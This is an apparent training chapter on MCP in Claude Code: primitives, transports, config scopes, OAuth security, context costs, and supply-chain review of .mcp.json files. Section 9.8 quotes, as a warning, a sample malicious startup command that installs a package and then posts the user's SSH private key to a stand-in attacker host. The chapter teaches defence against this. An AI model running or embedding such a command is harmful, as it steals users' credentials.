# Chapter 09 -- MCP (Model Context Protocol)

**TL;DR.** MCP is the open standard that lets Claude Code reach the systems it doesn't ship with: issue trackers, databases, monitoring, design tools, internal APIs. The protocol exposes three server-side primitives (**tools**, **resources**, **prompts**) over two transports (**stdio** for local processes, **streamable HTTP** for remote services), configured at three scopes (**local**, **project**, **user**) plus enterprise-managed and plugin-bundled layers. Your job as the senior in the room is fourfold. Know the primitives well enough to choose MCP over a skill or subagent when the task is genuinely "reach a live external system." Get auth right, which means OAuth 2.1 with PKCE for remote servers and never API keys in committed files. Treat `.mcp.json` as executable supply chain and review it like code. And keep context cheap, which in 2026 means leaning on **tool search** (deferred tool definitions, on by default) and, for high-volume integrations, **code execution with MCP**. The protocol and the CLI both ship fast. Verify version-pinned details against the changelog before you teach or automate against them. [^1] [^2]

> **Version-sensitivity note.** Claude Code ships near-daily, and the MCP spec itself versions on a date string (the spec revision referenced here is `2025-11-25`, and the wire `protocolVersion` you'll see in handshakes is a date like `2025-06-18`). Every flag, env var, and build-pinned minimum below was accurate on the access date but should be re-checked against the [Claude Code changelog](https://code.claude.com/docs/en/changelog.md) and the [MCP spec](https://modelcontextprotocol.io/specification/latest) before you script or teach against it.

---

## 9.1 What MCP is, and the one-line heuristic for when to use it

MCP, the Model Context Protocol, is an open standard for connecting AI applications to external tools and data. The marketing line is "USB-C for AI." The useful line is operational, and it comes straight from the docs:

> **Connect a server when you find yourself copying data into chat from another tool, like an issue tracker or a monitoring dashboard.** Once connected, Claude can read and act on that system directly instead of working from what you paste. [^1]

That heuristic is the whole thing. MCP turns "paste the JIRA ticket, paste the Sentry stack trace, paste the schema" into Claude reading JIRA, querying Sentry, and inspecting the schema directly. Once it's connected, you can ask Claude Code to implement a feature from `ENG-4521`, cross-reference its usage in Sentry and Statsig, pull affected users from Postgres, and open a PR, all in one turn, with you out of the loop of hand-carrying the data. [^1]

### Architecture: host, client, server

MCP is client-server, and the role names earn their keep because the security model is built on them. [^2]

- **Host** is the AI application that coordinates one or more clients. Claude Code is a host. So are Claude Desktop, VS Code, Cursor.
- **Client** is a component *inside* the host that maintains one dedicated connection to one server. A host with four servers instantiates four clients.
- **Server** is the program that provides context. "Server" is about role, not location: a local filesystem server launched over stdio and a remote Sentry server reached over HTTPS are both "servers." Local stdio servers typically serve a single client; remote HTTP servers typically serve many. [^2]

Two layers carry the protocol:

- **Data layer** is JSON-RPC 2.0. It defines lifecycle (`initialize` -> capability negotiation -> `notifications/initialized`), the primitives, and notifications. This is the part you actually design against when you build a server.
- **Transport layer** is how bytes move (stdio or streamable HTTP), including message framing and, for HTTP, authentication. The same JSON-RPC messages ride either transport. [^2]

### Where MCP sits relative to skills, subagents, and hooks

This is the question a senior gets asked constantly, so anchor it before the details. Anthropic's own framing is a clean three-way split: "MCP connects Claude to data; Skills teach Claude what to do with that data," and subagents are "specialized AI assistants with their own context windows." Access, expertise, isolation. [^3]

| You need... | Reach for | Why not the others |
|---|---|---|
| Live data from / actions on an external system | **MCP server** | A skill can't query your prod DB; it only knows *how* |
| Reusable knowledge or a procedure Claude runs itself | **Skill** | MCP adds protocol + network overhead for what is just instructions |
| Isolation / parallel work / a clean context window | **Subagent** | MCP doesn't isolate context; it *adds* to it (see Ch. 08) |
| A guardrail the model can't talk its way around | **Hook** | MCP tools are model-controlled; the model decides whether to call them |

These compose. A subagent can be scoped to exactly one MCP server (`mcpServers` in its frontmatter). A skill can document how to use an MCP tool. A hook can gate which MCP tools are even allowed. The mistake is reaching for MCP when the real need was "Claude needs to know our deploy procedure," which is a skill, or "stop Claude from force-pushing," which is a hook. MCP earns its weight when the answer lives genuinely outside the model and outside the repo. [^3]

---

## 9.2 The three server primitives

MCP servers expose exactly three kinds of capability. The distinction a senior cares about is **who controls invocation**, because that determines how the capability shows up in Claude Code and how much you can trust it. [^2]

### Tools: model-controlled

Tools are executable functions the *model* decides to invoke: file operations, API calls, database queries, ticket creation. Discovery is `tools/list`; execution is `tools/call`. Each tool advertises a `name`, a human `title`, a `description`, and an `inputSchema` (JSON Schema) that drives validation and tells the model how to call it. [^2]

A `tools/call` returns a `content` array of typed blocks (text, image, embedded resource), so a single call can return rich, multi-format output. [^2]

In Claude Code, MCP tools surface with a namespaced, callable name you use in permission rules, a skill's `allowed-tools`, or a subagent's `tools` field:

```
mcp__<server-name>__<tool-name>                        # e.g. mcp__github__list_issues
mcp__plugin_<plugin-name>_<server-name>__<tool-name>   # plugin-bundled servers
```

For plugin-bundled tools, any character outside `A-Z a-z 0-9 _ -` is replaced with `_`. [^1]

Tool descriptions are the new context tax. Because tools are model-controlled, the model reads every advertised description to decide what to call. That's the reason section 9.6 (tool search) and section 9.7 (code execution) exist at all. At scale, the dominant cost is tool *definitions*, not tool *results*.

### Resources: application-controlled

Resources are read-only data sources: file contents, DB records, API responses, schemas. Discovery is `resources/list`; retrieval is `resources/read`. The defining trait is that resources are **application-controlled**, not model-controlled. Your app, or you, decides when to pull one into context, rather than letting the model fire it off. [^2]

In Claude Code you reference a resource with `@`-mention syntax, exactly like a file:

```
Can you analyze @github:issue://123 and suggest a fix?
Please review the API docs at @docs:file://api/authentication
Compare @postgres:schema://users with @docs:file://database/user-model
```

The format is `@server:protocol://resource/path`; type `@` to autocomplete across all connected servers, and referenced resources are fetched and attached automatically. [^1]

### Prompts: user-controlled

Prompts are reusable templates the *user* invokes: parameterized workflows the server author has pre-written. Discovery is `prompts/list`; retrieval is `prompts/get`. They surface in Claude Code as slash commands:

```
/mcp__github__list_prs
/mcp__github__pr_review 456
/mcp__jira__create_issue "Bug in login flow" high
```

Arguments are passed space-separated and parsed against the prompt's declared parameters; the result is injected straight into the conversation. [^1]

### The control-axis table (slide-ready)

| Primitive | Controlled by | Discover / use | Surfaces in Claude Code as |
|---|---|---|---|
| **Tool** | Model | `tools/list` / `tools/call` | `mcp__server__tool` (model calls it) |
| **Resource** | Application / user | `resources/list` / `resources/read` | `@server:proto://path` |
| **Prompt** | User | `prompts/list` / `prompts/get` | `/mcp__server__prompt [args]` |

### Client primitives (so you know they exist)

The protocol is bidirectional. Servers can call *back* into the client too. Three client-side primitives let server authors build richer interactions: [^2]

- **Sampling** (`sampling/createMessage`) lets the server ask the host's LLM for a completion, so the server author gets model access without bundling a model SDK or key.
- **Elicitation** (`elicitation/create`) lets the server request structured input from the *user* mid-task. Claude Code renders this automatically as a **form-mode** dialog (fields) or **URL-mode** dialog (open a browser to authenticate or approve). No client config needed; you can auto-respond via the `Elicitation` hook. [^1]
- **Logging** lets servers emit log messages. The related **roots** primitive (`roots/list`, with `roots/list_changed` notifications) lets a client tell a server which directories to focus on. Claude Code sets `CLAUDE_PROJECT_DIR` in spawned stdio servers and answers a server's `roots/list` request with the launch directory. [^2] [^4] [^1]

There's also an **experimental Tasks** primitive, a durable execution wrapper for long-running requests (deferred result retrieval, status tracking). Treat it as experimental; verify before depending on it. [^2]

### The lifecycle in one breath

MCP is a *stateful* protocol. The connection opens with an `initialize` request carrying a `protocolVersion` (a date string like `2025-06-18`) and a `capabilities` object; the server responds with its own version and capabilities (`"tools": {"listChanged": true}` means "I support tools and will notify you when the list changes"); the client sends `notifications/initialized`. After that, the client lists and uses primitives. If the two sides can't agree on a mutually compatible protocol version, the connection should terminate rather than guess. [^2]

Then there's the dynamic part. Servers that declared `listChanged` can send `notifications/tools/list_changed` (and the resource and prompt equivalents) at any time. Claude Code honors these and refreshes capabilities without a reconnect. That is useful, and it is also a security surface, because a server can change the tools you have after you approved it (see section 9.8). [^1]

---

## 9.3 Transports: stdio vs streamable HTTP (and the deprecated ones)

Two transports carry the same JSON-RPC. Pick by where the server runs and who connects to it. [^2]

### stdio: local processes

The server runs as a child process on your machine; messages flow over stdin/stdout. No network, no network overhead, lowest latency. A stdio server typically serves exactly one client, your session. It's ideal for tools that need direct system access, custom local scripts, or anything you don't want crossing a network. [^2]

```bash
# stdio: everything after `--` is handed to the server untouched
claude mcp add --env AIRTABLE_API_KEY=YOUR_KEY --transport stdio airtable \
  -- npx -y airtable-mcp-server
```

The `--` separator is load-bearing: it divides Claude's own flags (`--transport`, `--env`, `--scope`) from the command that launches the server. Without it, Claude tries to parse the server's flags as its own. A documented gotcha: `--env` accepts multiple `KEY=value` pairs, so if the server name sits directly after `--env`, the CLI reads the name as another pair and rejects it. Put another flag between `--env` and the name. [^1]

Claude Code sets `CLAUDE_PROJECT_DIR` in the spawned server's environment (the project root). Read it inside your server (`process.env.CLAUDE_PROJECT_DIR` / `os.environ["CLAUDE_PROJECT_DIR"]`) rather than depending on the working directory. In a project- or user-scoped `.mcp.json`, reference it with a default, `${CLAUDE_PROJECT_DIR:-.}`, because it lives in the *server's* env, not Claude's. [^1]

### Streamable HTTP: remote services

HTTP POST for client-to-server, optional Server-Sent Events for streaming back. This is the recommended transport for remote/cloud servers and the only one that supports OAuth and the `--transport` flag. One HTTP server typically serves *many* clients. [^2] [^1]

```bash
claude mcp add --transport http notion https://mcp.notion.com/mcp
claude mcp add --transport http secure-api https://api.example.com/mcp \
  --header "Authorization: Bearer your-token"
```

In JSON config (`.mcp.json`, `~/.claude.json`, or `claude mcp add-json`), the `type` field accepts `streamable-http` as an alias for `http`, so configs copied from a vendor's docs work unmodified. [^1]

Resilience is built in. If an HTTP/SSE server drops mid-session, Claude Code reconnects with exponential backoff, up to five attempts, starting at 1s and doubling, then marks the server failed (retry manually from `/mcp`). The same backoff applies to initial connection: as of v2.1.121, Claude retries the initial connect up to three times on transient errors (5xx, connection refused, timeout) but does *not* retry auth or not-found errors, which require a config change. stdio servers are local processes and are not auto-reconnected. [^1]

### Deprecated / niche transports

- **SSE (Server-Sent Events) as a standalone transport is deprecated.** Use HTTP. The `--transport sse` flag still exists for older servers (`claude mcp add --transport sse asana https://mcp.asana.com/sse`) but is on its way out. [^1]
- **WebSocket (`type: "ws"`)** holds a persistent bidirectional connection, suited to servers that push events unprompted. It is header-auth-only (no OAuth), configured via `claude mcp add-json`, not `--transport`. Prefer HTTP unless you specifically need server-initiated push. [^1]

### Decision rule

| Situation | Transport |
|---|---|
| Local tool, single session, direct system access, secrets you won't network | **stdio** |
| Remote/cloud service, multi-client, OAuth | **streamable HTTP** |
| Server pushes events unprompted, OAuth not needed | WebSocket (niche) |
| Legacy server you can't change | SSE (deprecated, migrate) |

---

## 9.4 Scopes: local, project, user, and who sees `.mcp.json`

Scope controls which projects a server loads in and whether your team gets it. Three scopes, plus enterprise-managed and plugin layers above them. [^1]

| Scope | Loads in | Shared with team | Stored in |
|---|---|---|---|
| **local** (default) | Current project only | No | `~/.claude.json` (under that project's path) |
| **project** | Current project only | **Yes, via version control** | `.mcp.json` in project root |
| **user** | All your projects | No | `~/.claude.json` |

```bash
claude mcp add --transport http stripe https://mcp.stripe.com                       # local (default)
claude mcp add --transport http paypal --scope project https://mcp.paypal.com/mcp   # project -> .mcp.json
claude mcp add --transport http hubspot --scope user https://mcp.hubspot.com/anthropic  # user
```

A naming trap worth flagging: in older versions, `local` was called `project` and `user` was called `global`. The labels moved; verify what your version means. Also note "local scope" for MCP (stored in `~/.claude.json`) is *not* the same as general local settings (`.claude/settings.local.json`). [^1]

### Precedence

When the same server is defined in multiple places, Claude connects once, using the highest-precedence definition. Entries are not merged across scopes. The winning source's entry is used whole. [^1]

```
local  >  project  >  user  >  plugin-provided  >  claude.ai connectors
```

The three scopes match duplicates by **name**; plugins and connectors match by **endpoint** (same URL or command). [^1]

### `.mcp.json` is the team-shared, version-controlled file

The project scope writes to `.mcp.json` at the repo root, designed to be committed so every teammate gets the same servers. That same convenience is exactly why it's a supply-chain surface (section 9.8). The format is standardized:

```json
{
  "mcpServers": {
    "shared-server": { "command": "/path/to/server", "args": [], "env": {} }
  }
}
```

For security, Claude Code **prompts for approval before using a project-scoped server from `.mcp.json`.** Pending servers show as `Pending approval` in `claude mcp list`; rejected ones as `Rejected`. Reset your approval choices with `claude mcp reset-project-choices`. [^1]

### Environment-variable expansion in `.mcp.json`

So teams can share a config without baking in machine-specific paths or secrets, `.mcp.json` supports `${VAR}` and `${VAR:-default}` expansion in `command`, `args`, `env`, `url`, and `headers`. A required variable with no default and no value makes the config fail to parse. Fail-fast, which is the behavior you want. [^1]

```json
{
  "mcpServers": {
    "api-server": {
      "type": "http",
      "url": "${API_BASE_URL:-https://api.example.com}/mcp",
      "headers": { "Authorization": "Bearer ${API_KEY}" }
    }
  }
}
```

This is the right pattern for committed configs: **structure in git, secrets in the environment.**

### Other ways servers arrive

- **`claude mcp add-json <name> '<json>'`** pastes a full JSON config (use `--scope user` to land it in user config). [^1]
- **`claude mcp add-from-claude-desktop`** imports Desktop's servers (macOS/WSL only). [^1]
- **claude.ai connectors**: if you logged in with a Claude.ai account, connectors you added there appear automatically (fetched only when your active auth method is the Claude.ai subscription, not when `ANTHROPIC_API_KEY`/Bedrock/Vertex is active). Disable with `ENABLE_CLAUDEAI_MCP_SERVERS=false`. [^1]
- **Plugin-bundled servers**: plugins can ship MCP servers in `.mcp.json` at the plugin root or inline in `plugin.json`, using `${CLAUDE_PLUGIN_ROOT}` / `${CLAUDE_PLUGIN_DATA}` / `${CLAUDE_PROJECT_DIR}`. They start automatically when the plugin is enabled; run `/reload-plugins` after toggling. [^1]

### Managing servers

```bash
claude mcp list            # all configured servers (+ pending/rejected status)
claude mcp get github      # details for one server (incl. whether OAuth is configured)
claude mcp remove github
/mcp                       # (inside Claude Code) status panel, tool counts, OAuth login
```

The `/mcp` panel shows a tool count per server and flags servers that advertise the tools capability but expose none. The server name `workspace` is reserved, so Claude Code skips it and warns you to rename. [^1]

---

## 9.5 Authentication and security: OAuth 2.1 + PKCE

For remote (HTTP) servers, authentication is where seniors earn their keep. The short version: OAuth 2.1 with PKCE for anything remote, per-user credentials instead of shared secrets in committed files, short-lived tokens. Here's the depth behind that.

### How Claude Code triggers auth

Claude Code flags a remote server as needing auth when the server responds `401 Unauthorized` or `403 Forbidden`. A server returning a `WWW-Authenticate` header that points at its authorization server gets automatic discovery. You complete the flow with `/mcp` (it opens a browser; tokens are stored securely and refreshed automatically). If you configured a static `Authorization` header and the server rejects it, Claude reports a *failed connection* rather than falling back to OAuth, so a bad token doesn't silently kick off a browser flow. [^1]

```bash
claude mcp add --transport http sentry https://mcp.sentry.dev/mcp
/mcp     # then complete browser login; "Clear authentication" in the menu revokes
```

### What the MCP spec actually requires

The protocol's authorization model is built on a deliberately narrow subset of OAuth standards, so the exact shape is worth knowing. It's what your own server has to implement, and it's what a security reviewer will ask about. [^5]

- Auth is **OPTIONAL** for MCP overall, but HTTP-transport servers that implement it **SHOULD** conform to the spec. **stdio servers SHOULD NOT use this OAuth flow.** They retrieve credentials from the environment instead (their security boundary is the local process, not a token). [^5]
- The protected **MCP server is an OAuth 2.1 resource server**; the **MCP client** (Claude Code) is the OAuth client; the **authorization server** (which may be hosted with the resource server or be a separate entity) issues tokens. [^5]
- **PKCE is mandatory.** Clients **MUST** implement PKCE and use the **`S256`** method when technically capable, and **MUST** verify the auth server advertises PKCE support (via `code_challenge_methods_supported` in metadata) before proceeding. If that field is absent, the client **MUST** refuse to proceed. PKCE defeats authorization-code interception and injection. [^5]
- **Discovery** layers on real RFCs: MCP servers **MUST** implement RFC 9728 Protected Resource Metadata (advertising their `authorization_servers`); clients **MUST** use it to discover the auth server, then fetch auth-server metadata via RFC 8414 / OpenID Connect Discovery (clients **MUST** support both). Claude Code's default discovery chain: RFC 9728 at `/.well-known/oauth-protected-resource`, falling back to RFC 8414 at `/.well-known/oauth-authorization-server`. Override with `authServerMetadataUrl` in the server's `oauth` config block (HTTPS-only; needs v2.1.64+). [^1] [^5]
- **Resource indicators (RFC 8707) are mandatory.** The client **MUST** send a `resource` parameter (the canonical MCP server URI) in both authorization and token requests, and the server **MUST** validate that tokens were issued specifically for it (audience binding). This is what stops a token minted for service A from being replayed against service B. [^5]
- **Client registration** has a priority order: pre-registered credentials -> **Client ID Metadata Documents (CIMD)** (the client uses an HTTPS URL pointing to its metadata JSON as the `client_id`; the common case when client and server have no prior relationship) -> **Dynamic Client Registration (RFC 7591)** as a backwards-compat fallback -> prompt the user. Claude Code supports CIMD, pre-registration, and dynamic registration, and discovers CIMD automatically. [^5] [^1]
- **Token hygiene.** Redirect URIs **MUST** be `localhost` or HTTPS; all auth-server endpoints **MUST** be served over HTTPS; auth servers **SHOULD** issue short-lived access tokens and **MUST** rotate refresh tokens for public clients. [^5]

### Claude Code's OAuth knobs (the ones you'll actually touch)

- **`--callback-port PORT`** fixes the OAuth callback port to match a server's pre-registered redirect URI (`http://localhost:PORT/callback`). Use alone (with dynamic registration) or with `--client-id`. HTTP/SSE only; no effect on stdio. [^1]
- **`--client-id` / `--client-secret`** cover servers that don't support dynamic registration ("Incompatible auth server: does not support dynamic client registration"). `--client-secret` prompts with masked input; the secret is stored in the system keychain (macOS) or a credentials file, **never in your config**. For CI, set `MCP_CLIENT_SECRET` to skip the prompt. Public clients (no secret) use `--client-id` alone. [^1]
- **`oauth.scopes`** in `.mcp.json` pins the exact space-separated scope set Claude requests, so a security team can restrict an over-broad upstream to an approved subset. It takes precedence over both `authServerMetadataUrl` and discovered scopes. Claude appends `offline_access` automatically if the auth server advertises it (so tokens can refresh without a new browser sign-in). On a 403 `insufficient_scope`, Claude re-authenticates with the *same* pinned scopes, so widen the pin if a tool genuinely needs more. [^1]

```json
{
  "mcpServers": {
    "slack": {
      "type": "http",
      "url": "https://mcp.slack.com/mcp",
      "oauth": { "scopes": "channels:read chat:write search:read" }
    }
  }
}
```

### Non-OAuth auth: `headersHelper`

For Kerberos, short-lived internal tokens, or internal SSO, use `headersHelper` to generate request headers at connection time. Claude runs the command (10s timeout, shell) and merges its stdout JSON into the connection headers. It runs fresh on every connect, with no caching, so your script owns token reuse, and Claude passes it `CLAUDE_CODE_MCP_SERVER_NAME` and `CLAUDE_CODE_MCP_SERVER_URL` so one helper can serve many servers. Because it executes arbitrary shell, at project/local scope it only runs *after* you accept the workspace-trust dialog. [^1]

```json
{
  "mcpServers": {
    "internal-api": {
      "type": "http",
      "url": "https://mcp.internal.example.com",
      "headersHelper": "/opt/bin/get-mcp-auth-headers.sh"
    }
  }
}
```

### Permissions

MCP tools are gated by the same permissions system as everything else. Rule shapes: [^1]

```
mcp__github__list_issues     # one specific tool
mcp__github                  # an entire server (where supported)
mcp__*                       # all MCP tools
```

You can also deny the `ToolSearch` tool outright (`"permissions": {"deny": ["ToolSearch"]}`) if you want MCP tools never auto-discovered. [^1]

### The MCP threat model every senior should carry

The spec ships a dedicated security-best-practices doc. Five threats are worth memorizing: [^6]

1. **Token passthrough is explicitly forbidden.** An MCP server **MUST NOT** accept any token that wasn't issued *to it*, and **MUST NOT** forward a client's token to a downstream API. Passthrough circumvents rate-limiting and validation controls, poisons the audit trail (downstream logs show the wrong identity), breaks the downstream trust boundary, and turns the server into a data-exfiltration proxy for a stolen token. If your server calls an upstream API, it acts as a *separate* OAuth client and uses a *separate* token. [^6]
2. **Confused deputy.** A proxy server using a static client ID toward a third-party auth server, combined with dynamic client registration and a consent cookie, lets an attacker skip the consent screen and steal an auth code. Mitigation: the proxy **MUST** obtain *per-client* consent before forwarding, validate exact redirect URIs, and use single-use `state` values set only *after* consent is approved. [^6]
3. **Session hijacking.** Servers **MUST NOT** use sessions for authentication and **MUST** verify every inbound request; use non-deterministic session IDs (CSPRNG-generated UUIDs); bind session IDs to user identity (`<user_id>:<session_id>`) so a guessed session ID can't impersonate another user. [^6]
4. **SSRF during OAuth discovery.** A *malicious server* can hand the client metadata URLs pointing at `169.254.169.254` (cloud metadata), internal IPs, or localhost services. Mitigation lives in the client: enforce HTTPS, block private/reserved IP ranges, validate redirect targets, watch for DNS-rebinding TOCTOU, and prefer an egress proxy for server-side deployments. Avoid hand-rolling IP validation; encoding tricks (octal, hex, IPv4-mapped IPv6) defeat naive parsers. [^6]
5. **Scope minimization.** Avoid publishing every scope in `scopes_supported`, and avoid requesting them all. Start with a minimal read/discovery scope and elevate incrementally via `WWW-Authenticate` `scope` challenges. Broad omnibus scopes (`*`, `full-access`) expand blast radius, drive consent abandonment, and muddy audit. [^6]

There's also a sixth, aimed at local servers (section 9.8): **local MCP server compromise**, a malicious startup command or payload running with your full privileges. [^6]

---

## 9.6 Keeping MCP cheap: tool search and output limits

The hidden cost of MCP isn't the network round-trips. It's context. Every advertised tool definition the model has to read is competing with your actual work for window space. Claude Code's answer is tool search.

### Tool search (on by default)

With tool search enabled, MCP tool *definitions* are **deferred**. Only tool names and server instructions load at session start, and Claude uses a `ToolSearch` tool to pull in full definitions on demand. Only the tools Claude actually uses enter context, so adding more servers has minimal context impact. There's no fixed per-server tool cap; your context budget is the practical limit. From your seat, MCP tools behave exactly as before. [^1]

Control it with `ENABLE_TOOL_SEARCH`: [^1]

| Value | Behavior |
|---|---|
| (unset) | All MCP tools deferred, loaded on demand (default); falls back to loading upfront on Vertex AI or a non-first-party `ANTHROPIC_BASE_URL` |
| `true` | Force deferral, even on Vertex/proxies that may not support it |
| `auto` | Threshold mode: load upfront if tools fit within 10% of context, defer the overflow |
| `auto:N` | Threshold mode at a custom percent (`auto:5` = 5%) |
| `false` | Load all tools upfront, no deferral |

Caveats: tool search needs a model that supports `tool_reference` blocks (**Haiku models don't**), and it's disabled by default on Vertex AI and when `ANTHROPIC_BASE_URL` points at a non-first-party host (most proxies don't forward `tool_reference`). On Vertex, support starts at Sonnet 4.5 and Opus 4.5. When tool search is off and a request needs a still-connecting server, Claude waits via the `WaitForMcpServers` tool; with tool search on, the wait happens inside `ToolSearch`. [^1]

There's an escape hatch for the tools Claude needs every turn. Set `"alwaysLoad": true` on the server (v2.1.121+) to force its tools into context at startup regardless of `ENABLE_TOOL_SEARCH`. A server author can mark individual tools with `"anthropic/alwaysLoad": true` in the tool's `_meta`. Note `alwaysLoad: true` blocks startup until that server connects (capped at the 5s connect timeout), so use it sparingly. [^1]

If you write servers, tool search shifts where your effort lands. Your **server instructions** field matters more now. It's how Claude decides when to search for your tools, the same role a skill's description plays. Claude Code truncates tool descriptions *and* server instructions at **2KB each**; keep them tight, critical details first. [^1]

### Output limits

Large tool results are the other context drain. Claude Code warns when any MCP tool output exceeds **10,000 tokens**; the default *limit* is **25,000 tokens**, raised via `MAX_MCP_OUTPUT_TOKENS`. Results past the persist-to-disk threshold are written to disk and replaced with a file reference in the conversation. A server author can raise a *specific* tool's text threshold by setting `_meta["anthropic/maxResultSizeChars"]` in its `tools/list` entry (hard ceiling 500,000 chars), which is useful for schemas or full file trees. Image-returning tools are always bound by `MAX_MCP_OUTPUT_TOKENS`. Per-server tool-call timeouts: a `"timeout"` (ms) field in `.mcp.json` overrides `MCP_TOOL_TIMEOUT` for that server (values below 1000 are ignored and fall through to the env var). [^1]

---

## 9.7 Code execution with MCP (the scaling pattern)

For integrations with *many* tools and *large* results, Anthropic published a sharper pattern: present MCP servers as code APIs rather than direct tool calls, and let the agent write code that calls them. [^7]

The argument names two costs. Tool definitions overload the context window. And intermediate tool results consume additional tokens as they pass through context. Their worked example, downloading a meeting transcript from Google Drive and attaching it to a Salesforce record, forces the full transcript through context twice; for a 2-hour sales meeting that's an extra ~50,000 tokens. Present the tools as a filesystem hierarchy instead:

```
servers/
+-- google-drive/getDocument.ts
+-- salesforce/updateRecord.ts
```

The agent navigates that tree, loads *only* the tool definitions it needs, and runs the orchestration as code in a sandbox. Filtering, aggregation, and transformation happen *in code*, so only the final result returns to the model. Anthropic reports an example dropping from **150,000 tokens to 2,000** (a 98.7% saving). [^7]

The benefits a senior should weigh:

- **Progressive disclosure**: tool definitions loaded on demand via filesystem navigation, not all upfront.
- **Context-efficient results**: intermediate data stays in the sandbox; only what's needed crosses into context.
- **Privacy / PII**: sensitive data can be filtered or tokenized in the execution environment before the model ever sees it. This is directly relevant to regulated-industry work, where you keep PII out of the model's context by construction.
- **State persistence and skills**: the agent can checkpoint progress and save reusable code functions.

Reach for it when the shape of the work demands it: high tool counts, large result payloads, multi-step orchestration across servers, or hard data-privacy constraints. Leave it on the shelf for a handful of tools and small results. Tool search already handles the common case, and code execution adds a sandbox with its own resource limits, monitoring, and security considerations that direct tool calls avoid. [^7]

---

## 9.8 Supply-chain caution: review `.mcp.json` like code

This is the section to internalize even if you skim the rest. A committed `.mcp.json` is executable supply chain. A pull request can add a server, and that server is either a command that runs on your machine with your privileges (stdio), or a remote endpoint that receives your data and can change its own tool list after you approve it (HTTP).

What this means concretely:

- **A stdio server entry is arbitrary code execution by configuration.** The spec's own example of a malicious startup command is blunt: [^6]
  ```bash
  npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location
  ```
  A teammate, or a compromised upstream npm package referenced in `args`, can ship that in a `.mcp.json` diff. It runs with your privileges, with no inherent visibility into what executed. Review the `command`, every `args` entry, and `env` the way you'd review any code that runs as you. Claude Code's project-scope approval prompt is a backstop, not a substitute for reading the diff.
- **`headersHelper` runs arbitrary shell** at connect time. Treat it identically. [^1]
- **Remote servers can change their tools after approval.** Via `list_changed`, a server you trusted can advertise new tools mid-session, and prompt injection from content a server fetches can steer the model. Anthropic reviews its connector directory against listing criteria but explicitly **doesn't security-audit or manage any MCP server**, with the standing advice to "verify you trust each server before connecting it." [^8] [^1]
- **Never put secrets in committed `env` blocks.** Anyone with repo access (or, for `managed-mcp.json`, anyone on the machine) can read them. Use `${VAR}` expansion, OAuth, or `headersHelper` for per-user credentials. [^8]

### A review checklist for an `.mcp.json` PR

1. **New server?** Who added it, and is the source trusted? Pin package versions in `args` where you can.
2. **stdio command**: read `command` + `args` + `env` line by line. Does it download-and-run? Touch `~/.ssh`, `~/.aws`, system dirs? Make network calls beyond its stated purpose?
3. **Remote URL**: is it the official endpoint? HTTPS? Does `oauth.scopes` pin a least-privilege set, or is it requesting everything?
4. **Secrets**: any literal tokens/keys in `env` or `headers`? Reject; require `${VAR}`.
5. **`headersHelper`**: what does the script do? Where does it live?
6. **`alwaysLoad` / large output annotations**: justified, or just context bloat?

### Reproducible, locked-down configs (CI and hardening)

For CI and for sessions where you want *only* a known server set:

- **`--mcp-config <file-or-string>`** loads MCP servers from JSON files or strings (space-separated). **`--strict-mcp-config`** tells Claude to use *only* the servers from `--mcp-config`, ignoring all other MCP configurations (`~/.claude.json`, `.mcp.json`, user scope). Together they give a reproducible, side-effect-free config that is ideal for CI. Pass `--strict-mcp-config` *without* `--mcp-config` to load no MCP servers at all. [^9]

```bash
claude --strict-mcp-config --mcp-config '{"mcpServers":{"db":{"type":"stdio","command":"npx","args":["-y","@bytebase/dbhub","--dsn","..."]}}}'
```

### Enterprise / managed control (the regulated-industry lever)

For org-wide control, administrators deploy a `managed-mcp.json` and/or allow/deny lists. This is the right hook for a SOC2/HIPAA shop. [^8]

- **`managed-mcp.json`** at a system path (`/Library/Application Support/ClaudeCode/`, `/etc/claude-code/`, or `C:\Program Files\ClaudeCode\`) gives Claude *exclusive* control: it loads only those servers; users can't add, modify, or use any other (including plugin and claude.ai servers, unless `allowAllClaudeAiMcps: true`, v2.1.149+). An empty `{"mcpServers": {}}` **disables MCP entirely.** Deploy via MDM/GPO/fleet tooling, since it can't ride server-managed settings. [^8]
- **`allowedMcpServers` / `deniedMcpServers`** filter what users configure, matching by `serverUrl` (wildcards OK), `serverCommand` (exact, every arg in order), or `serverName` (exact). **Denylist always wins; nothing overrides a denylist match.** Critically, a name-only allowlist is *not* a security control, because users assign names, so a user can call anything `github`. Enforce with `serverUrl`/`serverCommand`. Pair `allowedMcpServers` with `allowManagedMcpServersOnly: true` so user/project allowlists can't broaden it (denylists still merge from everywhere, so users can always block more for themselves). [^8]
- **Monitoring**: with OpenTelemetry export and `OTEL_LOG_TOOL_DETAILS=1`, you get the MCP server and tool names users actually invoke, for audit and for spotting shadow integrations. [^8]

| Posture | Configure |
|---|---|
| Disable MCP entirely | `managed-mcp.json` with `{}` |
| Fixed approved set, no additions | `managed-mcp.json` with the servers |
| Approved catalog (users add from a list) | `allowedMcpServers` + `allowManagedMcpServersOnly: true` |
| Block known-bad, allow the rest | `deniedMcpServers` |
| Plugin servers only | `strictPluginOnlyCustomization` with `mcp` |

---

## 9.9 When a senior should build a server

Most of the time you *consume* MCP servers. You *build* one when the answer to all three is yes:

1. **Is the capability genuinely external?** Live data or actions in a system Claude can't reach from the repo (your prod DB, an internal service, a SaaS API). If it's knowledge or a procedure, build a **skill**. If it's isolation, use a **subagent** (Ch. 08). [^3]
2. **Is it reusable across sessions, teammates, and hosts?** MCP's payoff is a stable, discoverable, *portable* interface: an MCP server works in any MCP host (Claude Code, Desktop, Cursor, VS Code) because MCP is an open standard. If it's a one-off, a `Bash` call or a script is cheaper. [^2]
3. **Does the protocol overhead pay for itself?** A server means an SDK, a transport, lifecycle, (for remote) OAuth, and a tool surface to maintain. For a handful of internal calls behind a CLI you already trust, that's overhead without return.

### Build choices, in order

- **Transport.** **stdio** for a local, single-client tool that needs system access (and whose secrets you don't want networked). **Streamable HTTP** for a hosted, multi-client service, where OAuth 2.1 + PKCE is then mandatory, with RFC 9728 metadata and RFC 8707 audience-bound tokens. [^2] [^5]
- **SDK.** Official SDKs exist for several languages; the **MCP Inspector** is the standard dev/debug tool. You don't hand-roll JSON-RPC. [^2]
- **Let Claude scaffold it.** The official `mcp-server-dev` plugin scaffolds a remote-HTTP or local-stdio server for you: `/plugin install mcp-server-dev@claude-plugins-official`, then `/mcp-server-dev:build-mcp-server`. [^1]

### Design rules that separate a good server from a working one

- **Name tools for discovery.** Prefer `calculator_arithmetic` over `calculate`. With tool search on, the name and a tight description are how Claude finds your tool. [^2]
- **Write server instructions deliberately.** They tell Claude *when* to search for your tools. Budget 2KB each for instructions and descriptions; lead with the critical part. [^1]
